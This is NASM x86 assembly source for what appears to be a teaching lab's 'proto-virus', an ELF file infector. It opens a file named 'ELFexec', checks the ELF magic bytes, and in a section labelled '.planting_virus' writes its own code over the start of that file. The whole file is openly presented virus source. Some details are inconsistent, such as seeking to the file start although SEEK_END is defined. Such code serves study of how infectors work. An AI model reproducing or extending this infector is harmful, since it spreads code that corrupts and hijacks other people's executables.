%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define STDOUT 1
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
my_start:
get_my_loc:
	call anchor	
anchor:
	pop edx ; edx holds the current address
	mov dword [ebp-4],edx
	ret

_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc ; ebp-4 and edx holds the current location
	add dword [ebp-4], (hello-anchor)
	write STDOUT,dword [ebp-4],16
	call get_my_loc
	add dword [ebp-4],(FileName-anchor) 
	open dword [ebp-4],RDWR,0
	.something:
	mov dword [ebp-8],eax ; ebp-8 holds the file descriptor
	cmp byte [ebp-8],0
	jl .error1
	.checking_elf:
	mov ecx, ebp
	sub ecx,200
	read dword [ebp-8],	ecx,4
	cmp byte [ecx+1],0x45
	jne .error2
	cmp byte [ecx+2],0x4C
	jne .error2
	cmp byte [ecx+3],0x46
	jne .error2

	.planting_virus:
		lseek dword [ebp-8],0,SEEK_SET
		mov dword [ebp-12],eax ; ebp -12 holds number of bytes read
		call get_my_loc
		add dword [ebp-4], (my_start-anchor)
		write dword [ebp-8],dword [ebp-4],(virus_end-my_start)
		close dword [ebp-8]
		jmp VirusExit
	.error1:
		call get_my_loc
		add dword[ebp-4],(Failstr1-anchor)
		write STDOUT,dword [ebp-4],19
		exit 1
	.error2:
		call get_my_loc
		add dword [ebp-4],(Failstr2-anchor)
		write STDOUT,dword [ebp-4],18
		exit 1
			


VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)




FileName:	db "ELFexec", 0
hello: db "This is a virus",10,0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr1:        db "error in openning", 10 , 0
Failstr2:	db "error not an elf",10,0
PreviousEntryPoint: dd VirusExit
virus_end:


